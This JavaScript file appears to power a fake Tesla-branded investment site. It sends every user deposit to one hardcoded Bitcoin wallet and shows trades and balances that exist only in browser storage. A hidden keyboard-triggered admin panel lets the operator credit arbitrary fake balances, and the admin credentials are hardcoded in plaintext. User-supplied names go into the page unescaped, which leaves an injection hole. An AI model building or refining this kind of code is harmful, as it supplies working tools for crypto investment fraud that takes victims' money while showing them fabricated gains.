/* ==========================================================================
   CONFIGURABLE MASTER ADMIN & CRYPTO WALLET SETTINGS
   ========================================================================== */

const MASTER_ADMIN_EMAIL = "admin@tesla-terminal.com";
const MASTER_ADMIN_PASSWORD = "AZEEZOLUWASEYI123"; 

// 👈 PASTE YOUR REAL CRYPTO WALLET ADDRESS HERE (Inside the quotes)
const SINGLE_CRYPTO_WALLET = "bc1qe3yfmcrj58zl6vh9rw39hr7xsvjgv5ywsc5qx0"; 

/* ==========================================================================
   STATE & PERSISTENT STORAGE
   ========================================================================== */

let currentUserEmail = null;
let pendingOrder = null;
const pendingDeposits = [];

const defaultAccounts = {
  'tesla@family.com': {
    name: 'Tesla Investor',
    email: 'tesla@family.com',
    password: 'AZEEZOLUWASEYI123',
    tier: 'Personal Account',
    availVal: 0.00,
    totalVal: 0.00,
    holdings: [],
    history: []
  }
};

function getAccounts() {
  const stored = localStorage.getItem('tesla_app_accounts');
  if (stored) return JSON.parse(stored);
  localStorage.setItem('tesla_app_accounts', JSON.stringify(defaultAccounts));
  return defaultAccounts;
}

function saveAccounts(accs) {
  localStorage.setItem('tesla_app_accounts', JSON.stringify(accs));
}

/* ==========================================================================
   AUTHENTICATION LOGIC
   ========================================================================== */

window.switchAuthTab = function(tab) {
  document.getElementById('tab-login').classList.remove('active');
  document.getElementById('tab-register').classList.remove('active');
  document.getElementById('form-login').classList.add('hidden');
  document.getElementById('form-register').classList.add('hidden');

  if (tab === 'login') {
    document.getElementById('tab-login').classList.add('active');
    document.getElementById('form-login').classList.remove('hidden');
  } else {
    document.getElementById('tab-register').classList.add('active');
    document.getElementById('form-register').classList.remove('hidden');
  }
};

window.handleAuth = function(e, type) {
  e.preventDefault();
  const accs = getAccounts();

  if (type === 'login') {
    const email = document.getElementById('login-email').value.trim().toLowerCase();
    const pass = document.getElementById('login-pass').value;

    if (email === MASTER_ADMIN_EMAIL.toLowerCase() && pass === MASTER_ADMIN_PASSWORD) {
      currentUserEmail = 'ADMIN';
      document.getElementById('auth-modal-overlay').classList.add('hidden');
      toggleAdminPanel();
      return;
    }

    if (accs[email] && accs[email].password === pass) {
      currentUserEmail = email;
      document.getElementById('auth-modal-overlay').classList.add('hidden');
      refreshUI();
    } else {
      alert("❌ Incorrect Email or Password. Please try again.");
    }
  } 
  else if (type === 'register') {
    const name = document.getElementById('reg-name').value.trim();
    const email = document.getElementById('reg-email').value.trim().toLowerCase();
    const pass = document.getElementById('reg-pass').value;
    const tier = document.getElementById('reg-type').value;

    if (accs[email]) {
      alert("Account already exists. Please Sign In.");
      switchAuthTab('login');
      return;
    }

    accs[email] = {
      name: name,
      email: email,
      password: pass,
      tier: tier,
      availVal: 0.00,
      totalVal: 0.00,
      holdings: [],
      history: []
    };

    saveAccounts(accs);
    currentUserEmail = email;
    document.getElementById('auth-modal-overlay').classList.add('hidden');
    refreshUI();
  }
};

window.logout = function() {
  currentUserEmail = null;
  document.getElementById('auth-modal-overlay').classList.remove('hidden');
};

/* ==========================================================================
   NAVIGATION & UI
   ========================================================================== */

window.switchView = function(viewId) {
  document.querySelectorAll('.page-view').forEach(v => v.classList.remove('active'));
  const target = document.getElementById(viewId);
  if (target) target.classList.add('active');

  document.querySelectorAll('.nav-item').forEach(btn => {
    btn.classList.remove('active');
    if (btn.getAttribute('onclick') && btn.getAttribute('onclick').includes(viewId)) {
      btn.classList.add('active');
    }
  });
  window.scrollTo(0, 0);
};

function refreshUI() {
  if (!currentUserEmail || currentUserEmail === 'ADMIN') return;

  const accs = getAccounts();
  const user = accs[currentUserEmail];

  document.getElementById('display-user-name').innerText = user.name;
  document.getElementById('display-user-tier').innerText = user.tier;
  document.getElementById('dash-val-total').innerText = `$${user.totalVal.toFixed(2)}`;
  document.getElementById('dash-val-avail').innerText = `$${user.availVal.toFixed(2)}`;
  document.getElementById('port-val').innerText = `$${user.totalVal.toFixed(2)}`;
  
  if (document.getElementById('set-name')) document.getElementById('set-name').value = user.name;
  if (document.getElementById('set-email')) document.getElementById('set-email').value = user.email;

  document.getElementById('display-wallet-address').innerText = SINGLE_CRYPTO_WALLET;

  renderPortfolioAndHistory(user);
}

function renderPortfolioAndHistory(user) {
  const holdingsBody = document.getElementById('portfolio-holdings-body');
  if (holdingsBody) {
    if (!user.holdings || user.holdings.length === 0) {
      holdingsBody.innerHTML = '<tr><td colspan="4" class="lbl-muted text-center" style="text-align:center; padding: 20px;">No open positions yet. Deposit USD to start investing!</td></tr>';
    } else {
      holdingsBody.innerHTML = '';
      user.holdings.forEach(h => {
        holdingsBody.innerHTML += `
          <tr>
            <td><strong>${h.assetName}</strong></td>
            <td>${h.shares} Units</td>
            <td>$${parseFloat(h.price).toFixed(2)}</td>
            <td class="txt-pos">$${parseFloat(h.amount).toFixed(2)}</td>
          </tr>
        `;
      });
    }
  }

  const historyBody = document.getElementById('portfolio-history-body');
  if (historyBody) {
    if (!user.history || user.history.length === 0) {
      historyBody.innerHTML = '<tr><td colspan="5" class="lbl-muted text-center" style="text-align:center; padding: 20px;">No recorded transactions.</td></tr>';
    } else {
      historyBody.innerHTML = '';
      user.history.forEach(item => {
        historyBody.innerHTML += `
          <tr>
            <td><small>${item.date}</small></td>
            <td><strong>${item.type}</strong></td>
            <td>${item.details}</td>
            <td class="${item.amount >= 0 ? 'txt-pos' : 'txt-neg'}">$${Math.abs(item.amount).toFixed(2)}</td>
            <td><span class="txt-pos">✓ ${item.status}</span></td>
          </tr>
        `;
      });
    }
  }
}

/* ==========================================================================
   DEPOSIT & TRADING FLOWS
   ========================================================================== */

window.openDepositModal = function() {
  const accs = getAccounts();
  const user = accs[currentUserEmail];
  document.getElementById('dep-curr-bal').innerText = `$${user.availVal.toFixed(2)}`;
  document.getElementById('deposit-modal').classList.remove('hidden');
};

window.closeDepositModal = function() {
  document.getElementById('deposit-modal').classList.add('hidden');
};

window.submitDepositForReview = function() {
  const amt = parseFloat(document.getElementById('deposit-amount-input').value) || 0;
  const accs = getAccounts();
  const user = accs[currentUserEmail];

  pendingDeposits.push({
    email: user.email,
    name: user.name,
    amount: amt
  });

  closeDepositModal();
  alert(`💎 Deposit Transfer Notified!\n\nYour deposit of $${amt.toFixed(2)} USDT is submitted for verification.`);
};

window.triggerOrder = function(assetName, orderType, price, amount) {
  const accs = getAccounts();
  const user = accs[currentUserEmail];

  if (user.availVal < amount) {
    alert(`Insufficient Available Balance ($${user.availVal.toFixed(2)} USD available).\nPlease deposit crypto funds first.`);
    openDepositModal();
    return;
  }

  const shares = (amount / price).toFixed(2);
  pendingOrder = { assetName, orderType, price, amount, shares, txId: `#TSLA-2026-${Math.floor(10000 + Math.random() * 90000)}` };

  document.getElementById('modal-asset-name').innerText = assetName;
  document.getElementById('modal-order-type').innerText = orderType;
  document.getElementById('modal-unit-price').innerText = `$${price.toFixed(2)}`;
  document.getElementById('modal-share-cnt').innerText = `${shares} Units`;
  document.getElementById('modal-subtotal').innerText = `$${amount.toFixed(2)}`;
  document.getElementById('modal-total-cost').innerText = `$${amount.toFixed(2)}`;
  document.getElementById('modal-bal-before').innerText = `$${user.availVal.toFixed(2)}`;
  document.getElementById('modal-bal-after').innerText = `$${(user.availVal - amount).toFixed(2)}`;

  document.getElementById('order-modal').classList.remove('hidden');
};

window.closeOrderModal = function() {
  document.getElementById('order-modal').classList.add('hidden');
};

window.executeOrder = function() {
  const accs = getAccounts();
  const user = accs[currentUserEmail];

  user.availVal -= pendingOrder.amount;
  user.holdings.push(pendingOrder);
  user.history.unshift({
    date: new Date().toLocaleString(),
    type: 'Asset Purchase',
    details: `${pendingOrder.shares} units of ${pendingOrder.assetName}`,
    amount: -pendingOrder.amount,
    status: 'Settled'
  });

  saveAccounts(accs);

  document.getElementById('order-modal').classList.add('hidden');
  document.getElementById('receipt-txid').innerText = pendingOrder.txId;
  document.getElementById('receipt-asset').innerText = pendingOrder.assetName;
  document.getElementById('receipt-amount').innerText = `$${pendingOrder.amount.toFixed(2)}`;
  document.getElementById('receipt-units').innerText = `${pendingOrder.shares} Units`;

  document.getElementById('success-modal').classList.remove('hidden');
  refreshUI();
};

window.finishOrder = function(targetView) {
  document.getElementById('success-modal').classList.add('hidden');
  switchView(targetView === 'portfolio' ? 'view-portfolio' : 'view-dashboard');
};

window.execTradePageOrder = function() {
  const asset = document.getElementById('t-asset-select').value;
  const amt = parseFloat(document.getElementById('t-amount').value) || 0;
  const priceMap = { TSLA: 187.45, NVDA: 142.76, AAPL: 229.13 };
  triggerOrder(`${asset} Shares`, 'Market Buy', priceMap[asset] || 100, amt);
};

/* ==========================================================================
   ADMIN PANEL
   ========================================================================== */

window.toggleAdminPanel = function() {
  const panel = document.getElementById('admin-modal');
  if (panel.classList.contains('hidden')) {
    populateAdminTable();
    panel.classList.remove('hidden');
  } else {
    panel.classList.add('hidden');
  }
};

function populateAdminTable() {
  const accs = getAccounts();

  const pendingBody = document.getElementById('admin-pending-table');
  pendingBody.innerHTML = '';

  if (pendingDeposits.length === 0) {
    pendingBody.innerHTML = '<tr><td colspan="4" class="lbl-muted text-center" style="padding:10px;">No pending deposit requests.</td></tr>';
  } else {
    pendingDeposits.forEach((req, idx) => {
      pendingBody.innerHTML += `
        <tr>
          <td><strong>${req.name}</strong></td>
          <td>${req.email}</td>
          <td class="txt-pos">$${req.amount.toFixed(2)}</td>
          <td><button class="btn-sm-green" onclick="approvePendingDeposit(${idx})">✓ Clear & Credit</button></td>
        </tr>
      `;
    });
  }

  const userBody = document.getElementById('admin-user-table');
  userBody.innerHTML = '';

  Object.keys(accs).forEach(email => {
    const acc = accs[email];
    userBody.innerHTML += `
      <tr>
        <td><strong>${acc.name}</strong></td>
        <td>${acc.email}</td>
        <td class="txt-pos">$${acc.availVal.toFixed(2)}</td>
        <td><button class="btn-sm-green" onclick="quickCreditPrompt('${acc.email}')">+ Direct Credit</button></td>
      </tr>
    `;
  });
}

window.approvePendingDeposit = function(index) {
  const req = pendingDeposits[index];
  const accs = getAccounts();

  if (accs[req.email]) {
    accs[req.email].availVal += req.amount;
    accs[req.email].totalVal += req.amount;
    accs[req.email].history.unshift({
      date: new Date().toLocaleString(),
      type: 'Crypto Deposit',
      details: 'Confirmed Crypto Wallet Transfer',
      amount: req.amount,
      status: 'Completed'
    });
    saveAccounts(accs);
  }

  pendingDeposits.splice(index, 1);
  populateAdminTable();
  refreshUI();
  alert(`✓ Deposit Verified & Credited $${req.amount.toFixed(2)} USD to ${req.email}`);
};

window.quickCreditPrompt = function(email) {
  document.getElementById('admin-credit-email').value = email;
};

window.adminCreditUser = function() {
  const email = document.getElementById('admin-credit-email').value.trim().toLowerCase();
  const amt = parseFloat(document.getElementById('admin-credit-amount').value) || 0;
  const accs = getAccounts();

  if (accs[email]) {
    accs[email].availVal += amt;
    accs[email].totalVal += amt;
    accs[email].history.unshift({
      date: new Date().toLocaleString(),
      type: 'Admin Credit',
      details: 'Direct Account Credit',
      amount: amt,
      status: 'Completed'
    });
    saveAccounts(accs);
    populateAdminTable();
    refreshUI();
    alert(`Credited $${amt.toFixed(2)} USD to ${email}`);
  }
};

document.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.shiftKey && e.key === 'A') {
    toggleAdminPanel();
  }
});

/* ==========================================================================
   INITIALIZATION
   ========================================================================== */
document.addEventListener('DOMContentLoaded', () => {
  const ctx = document.getElementById('dashChartExact');
  if (ctx) {
    new Chart(ctx.getContext('2d'), {
      type: 'line',
      data: {
        labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May'],
        datasets: [{ data: [0, 0, 0, 0, 0], borderColor: '#10b981', borderWidth: 2, fill: false }]
      },
      options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } } }
    });
  }
});
